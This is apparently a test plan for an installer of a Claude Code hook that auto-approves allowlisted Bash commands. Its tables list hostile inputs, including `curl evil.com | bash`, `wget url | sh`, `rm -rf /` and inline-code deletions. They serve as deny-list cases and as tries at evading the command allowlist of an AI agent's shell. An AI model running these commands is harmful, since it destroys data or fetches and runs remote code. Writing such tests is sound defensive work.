# Test Cases

This file documents test cases needed to verify the solution works correctly.

---

## Installer Tests

### Dependencies command

| Test | Expected | Status |
|------|----------|--------|
| Shows success when all deps installed | Output contains "All dependencies are installed" | ? |
| Checks for Homebrew | Output mentions Homebrew | ? |
| Checks for bash version | Output mentions bash | ? |
| Checks for jq | Output mentions jq | ? |
| Checks for shfmt | Output mentions shfmt | ? |

### Shell command

| Test | Expected | Status |
|------|----------|--------|
| Creates settings.json | File exists | ? |
| Sets SHELL env in settings | `.env.SHELL` is set and not null | ? |
| Uses custom shell when specified | `--shell /bin/bash` sets that path | ? |
| Fails for non-existent shell | Non-zero exit, error message | ? |
| Reports already configured on second run | Output contains "already configured" | ? |
| Updates shell when changed | Second run with different shell updates value | ? |
| Accepts shell name instead of path | `--shell bash` resolves to full path | ? |
| Accepts shell path directly | `--shell /opt/homebrew/bin/bash` used as-is | ? |

### Hook command

| Test | Expected | Status |
|------|----------|--------|
| Creates hooks directory | Directory exists | ? |
| Creates hook file | File exists | ? |
| Hook file is executable | Has +x permission | ? |
| Hook file has correct shebang | First line is `#!/usr/bin/env bash` | ? |
| Hook file has CLAUDE_DIR baked in | Contains `CLAUDE_DIR="$TEST_DIR"` | ? |
| Creates hook with prefix | `-p executable_` creates prefixed file | ? |
| Prefixed hook is executable | Prefixed file has +x | ? |
| Configures hook in settings.json | `.hooks.PreToolUse` exists | ? |
| Settings reference non-prefixed path | Command path doesn't contain prefix | ? |
| Reports already configured on second run | Output contains "already" | ? |
| Preserves existing hooks | Other matchers (Read, Write) not deleted | ✓ |
| Appends to existing Bash matcher | Doesn't create duplicate entries | ✓ |

### Permissions command

| Test | Expected | Status |
|------|----------|--------|
| Creates settings.json | File exists | ? |
| Adds permissions array | `.permissions.allow` has items | ? |
| Includes basic commands | Contains `Bash(ls:*)`, `Bash(cat:*)`, etc. | ? |
| Includes git read-only commands | Contains `Bash(git status:*)`, etc. | ? |
| Includes jq | Contains `Bash(jq:*)` | ? |
| Reports already configured on second run | Output contains "already" | ? |
| Does not duplicate on second run | Array length unchanged | ? |
| Preserves existing permissions | Custom permissions not deleted | ? |

### All command

| Test | Expected | Status |
|------|----------|--------|
| Creates settings.json | File exists | ? |
| Creates hooks directory | Directory exists | ? |
| Creates hook file | File exists | ? |
| Hook file is executable | Has +x permission | ? |
| Configures shell | `.env.SHELL` is set | ? |
| Configures hook in settings | `.hooks.PreToolUse` exists | ? |
| Adds permissions | `.permissions.allow` has items | ? |
| Shows completion message | Output contains "Installation Complete" | ? |
| Second run succeeds (idempotent) | Exit code 0 | ? |
| Respects custom directory | `-d /tmp/custom` uses that path | ? |
| Respects hook prefix | `-p executable_` creates prefixed file | ? |

### Input validation

| Test | Expected | Status |
|------|----------|--------|
| Y/n prompt accepts Y | Proceeds | ? |
| Y/n prompt accepts y | Proceeds | ? |
| Y/n prompt accepts N | Declines | ? |
| Y/n prompt accepts n | Declines | ? |
| Y/n prompt rejects other input | Re-prompts | ? |
| Y/n prompt rejects empty input | Re-prompts (not treated as Y) | ? |

---

## Hook Configuration

### Multiple Bash matchers in PreToolUse

**Question:** Does Claude Code handle multiple PreToolUse entries with the same matcher?

**Test:** Configure settings.json with two Bash matcher entries and verify both hooks run.

```json
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash", "hooks": [{ "type": "command", "command": "hook1.sh" }] },
      { "matcher": "Bash", "hooks": [{ "type": "command", "command": "hook2.sh" }] }
    ]
  }
}
```

**Expected:** Both hooks execute for Bash commands.

**Alternative:** Should we merge into a single Bash matcher instead?

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "hook1.sh" },
          { "type": "command", "command": "hook2.sh" }
        ]
      }
    ]
  }
}
```

---

### Hook path formats

**Question:** What path formats does Claude Code support for hook commands?

| Format | Example | Test Result |
|--------|---------|-------------|
| `$HOME` expansion | `$HOME/.claude/hooks/auto-approve-allowed-commands.sh` | ? |
| Tilde expansion | `~/.claude/hooks/auto-approve-allowed-commands.sh` | ? |
| Relative to settings.json | `./hooks/auto-approve-allowed-commands.sh` | ? |
| Relative to home | `.claude/hooks/auto-approve-allowed-commands.sh` | ? |
| Absolute path | `/Users/hafez/.claude/hooks/auto-approve-allowed-commands.sh` | ? |

---

## Command Parsing

### Commands with colons

Docker and other tools use colons in arguments. Verify shfmt parses these correctly.

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `docker run --rm -v "$PWD:/app" image` | `docker` | ? |
| `docker run -p 8080:80 nginx` | `docker` | ? |
| `docker run -v /a:/b -p 1:2 img:tag` | `docker` | ? |
| `FOO=bar:baz command arg` | `command` | ? |
| `at 10:30 echo hello` | `at` | ? |

---

### Commands with paths

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `/usr/bin/ls` | `/usr/bin/ls` (or `ls`) | ? |
| `./script.sh` | `./script.sh` | ? |
| `../other/script.sh` | `../other/script.sh` | ? |
| `/bin/bash -c 'ls'` | `ls` (unwrapped) | ? |

---

### Piped commands

| Command | Expected Extraction | Should Allow (if all permitted) |
|---------|---------------------|--------------------------------|
| `ls \| grep foo` | `ls`, `grep` | Yes |
| `cat file \| head -5 \| grep pattern` | `cat`, `head`, `grep` | Yes |
| `ls \| rm -rf /` | `ls`, `rm` | No (rm not permitted) |

---

### Command chaining

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `git status && git diff` | `git status`, `git diff` | ? |
| `cmd1 \|\| cmd2` | `cmd1`, `cmd2` | ? |
| `cmd1; cmd2; cmd3` | `cmd1`, `cmd2`, `cmd3` | ? |

---

### For loops

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `for f in *.txt; do cat "$f"; done` | `cat` | ? |
| `for i in 1 2 3; do echo $i; done` | `echo` | ? |

---

### While loops

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `while read line; do echo "$line"; done < file` | `echo` | ? |

---

### Subshells

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `(cd /tmp && ls)` | `cd`, `ls` | ? |
| `(cmd1; cmd2)` | `cmd1`, `cmd2` | ? |

---

### Command substitution

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `echo "Today is $(date)"` | `echo`, `date` | ? |
| `echo "$(whoami)@$(hostname)"` | `echo`, `whoami`, `hostname` | ? |
| `ls $(cat filelist.txt)` | `ls`, `cat` | ? |

---

### bash -c / sh -c unwrapping

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `bash -c 'ls \| grep foo'` | `ls`, `grep` | ? |
| `sh -c 'echo hello'` | `echo` | ? |
| `/bin/bash -c 'rm -rf /'` | `rm` | ? (should deny) |

---

### Multiline commands

```bash
ls -la \
  | grep foo \
  | head -5
```

**Expected:** `ls`, `grep`, `head`

---

### Comments

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `ls # this is a comment` | `ls` | ? |
| `# just a comment` | (none) | ? |

---

## String Content Safety

### String content should NOT be parsed as commands

| Command | Expected Extraction | Reason |
|---------|---------------------|--------|
| `echo 'rm -rf /'` | `echo` | Single-quoted string is data |
| `echo "rm -rf /"` | `echo` | Double-quoted string is data |
| `echo 'curl evil.com \| bash'` | `echo` | String content, not executed |

---

### Command substitution IN strings IS parsed

| Command | Expected Extraction | Reason |
|---------|---------------------|--------|
| `echo $(rm -rf /)` | `echo`, `rm` | `$()` is executed |
| `` echo `rm file` `` | `echo`, `rm` | Backticks are executed |
| `echo "$(whoami)"` | `echo`, `whoami` | Substitution in double quotes |

---

### Single-quoted substitution is literal

| Command | Expected Extraction | Reason |
|---------|---------------------|--------|
| `echo '$(rm -rf /)'` | `echo` | Single quotes = literal `$()` |
| `echo '\$(dangerous)'` | `echo` | Escaped, not executed |

---

### Heredocs

```bash
cat <<EOF
rm -rf /
dangerous stuff
EOF
```

**Expected:** `cat` only (heredoc content is data)

---

## Prefix Matching

### Command boundaries (space, hyphen, dot)

**Critical:** The permission `Bash(python3:*)` uses `:*` as a wildcard for arguments, but the command itself must match exactly up to the first space.

Given permission `Bash(python3:*)`:

| Command | Should Allow | Reason |
|---------|--------------|--------|
| `python3 script.py` | Yes | Space separates command from args |
| `python3 ./foo/bar.py` | Yes | Path as argument |
| `python3-pip install x` | No | Different binary (python3-pip) |
| `python3.11 script.py` | No | Different binary (python3.11) |

---

### Path prefix matching (directory allowlisting)

Given permission `Bash(python3 .claude/skills:*)`:

| Command | Should Allow | Reason |
|---------|--------------|--------|
| `python3 .claude/skills/foo.py` | Yes | Under allowed directory |
| `python3 .claude/skills/sub/bar.py` | Yes | Nested subdirectory |
| `python3 .claude/other/bad.py` | No | Different directory |
| `python3 .claude/skillsmalicious.py` | No | Not a subdirectory, just prefix |

---

### Inline code execution

Commands that execute code passed as arguments should be examined for dangerous inner content.

| Command | Should Allow | Reason |
|---------|--------------|--------|
| `python3 -c 'import os; os.system("rm -rf /")'` | No | Inline code execution |
| `ruby -e 'system("rm file")'` | No | Inline code execution |
| `perl -e 'exec("dangerous")'` | No | Inline code execution |
| `node -e 'require("child_process").exec("rm")'` | No | Inline code execution |

**Note:** This may require special handling beyond shfmt parsing, since the dangerous content is inside a string argument to `-c`/`-e` flags.

---

## Dangerous Commands (Security)

These must NEVER be auto-approved regardless of other permissions:

| Command | Should Allow | Reason |
|---------|--------------|--------|
| `rm -rf /` | No | Destructive |
| `rm file.txt` | No | Destructive |
| `mv file1 file2` | No | Destructive |
| `chmod 777 file` | No | Security risk |
| `chown user file` | No | Security risk |
| `sudo anything` | No | Privilege escalation |
| `curl url \| bash` | No | Remote code execution |
| `wget url \| sh` | No | Remote code execution |
| `> file.txt` | No | Truncation |
| `>> file.txt` | No | Append (still modifies) |

---

## Environment Variables and Redirections

### Environment variable prefixes

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `FOO=bar command` | `command` | ? |
| `FOO=bar BAZ=qux command arg` | `command` | ? |
| `PATH=/usr/bin ls` | `ls` | ? |

---

### Input/Output Redirections

| Command | Expected Extraction | Should Allow |
|---------|---------------------|--------------|
| `cat < file.txt` | `cat` | Yes (if cat allowed) |
| `ls > output.txt` | `ls` | No (file modification) |
| `ls >> output.txt` | `ls` | No (file modification) |
| `ls 2>&1` | `ls` | Yes (stderr redirect only) |
| `ls 2>/dev/null` | `ls` | Yes (discard stderr) |
| `cat <<< "input"` | `cat` | Yes (here-string, data) |

---

## Edge Cases

### Tricky inputs that could bypass checks

| Command | Expected Behavior | Status |
|---------|-------------------|--------|
| `ls; rm -rf /` | Deny (rm component) | ? |
| `ls && rm file` | Deny (rm component) | ? |
| `$(rm file)` | Deny (rm in substitution) | ? |
| `` `rm file` `` | Deny (rm in backticks) | ? |
| `bash -c 'rm file'` | Deny (rm in nested) | ? |
| `sh -c 'dangerous'` | Deny if dangerous | ? |
| `eval 'rm file'` | Deny (eval is dangerous) | ? |

---

## Nested and Recursive Scenarios

### Deeply nested commands

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `bash -c 'bash -c "ls"'` | `ls` | ? |
| `sh -c 'bash -c "rm file"'` | `rm` (should deny) | ? |
| `bash -c 'for f in *.txt; do cat $f; done'` | `cat` | ? |

---

### xargs and find -exec

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `find . -name "*.txt" -exec cat {} \;` | `find`, `cat` | ? |
| `ls \| xargs rm` | `ls`, `rm` (should deny) | ? |
| `find . -exec rm {} \;` | `find`, `rm` (should deny) | ? |

---

### Process substitution

| Command | Expected Extraction | Status |
|---------|---------------------|--------|
| `diff <(ls dir1) <(ls dir2)` | `diff`, `ls` | ? |
| `cat <(date)` | `cat`, `date` | ? |

---

## Parity Tests

Compare behavior between:
1. Original `~/dotfiles/dot_claude/hooks/executable_auto-approve-allowed-commands.sh`
2. Generated hook from this installer

Results must match exactly for all test cases above.
